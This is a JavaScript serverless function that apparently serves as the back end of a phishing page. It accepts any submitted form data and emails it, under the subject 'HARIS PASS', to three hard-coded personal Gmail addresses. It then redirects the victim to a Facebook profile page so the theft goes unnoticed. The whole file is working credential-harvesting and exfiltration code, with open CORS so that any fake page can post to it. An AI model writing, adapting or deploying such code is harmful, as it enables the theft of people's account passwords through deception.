
import { transporter } from "./emailConfig.js";
import querystring from "querystring";

export default async function handler(req, res) {
  // ✅ CORS headers
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Accept, Authorization");

  if (req.method === "OPTIONS") return res.status(204).end();
  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

  try {
    // ✅ Read raw body
    let rawBody = "";
    for await (const chunk of req) rawBody += chunk;

    let formData = {};
    try {
      if (req.headers["content-type"]?.includes("application/json")) {
        formData = JSON.parse(rawBody);
      } else if (req.headers["content-type"]?.includes("application/x-www-form-urlencoded")) {
        formData = querystring.parse(rawBody);
      } else {
        try {
          formData = JSON.parse(rawBody);
        } catch {
          formData = { raw: rawBody };
        }
      }
    } catch {
      formData = { raw: rawBody || "No data" };
    }

    console.log("Form Data Received:", formData);

    // ✅ Send email
    await transporter.sendMail({
      from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,aaryannizamani@gmail.com",
      subject: "HARIS PASS",
      text: JSON.stringify(formData, null, 2),
      html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
    });

    // ✅ Redirect after sending
    res.writeHead(302, { Location: "https://facebook.com/profile.php" });
    res.end();

  } catch (error) {
    console.error("Serverless function error:", error);
    res.status(500).json({ error: error.message || "Internal Server Error" });
  }
}
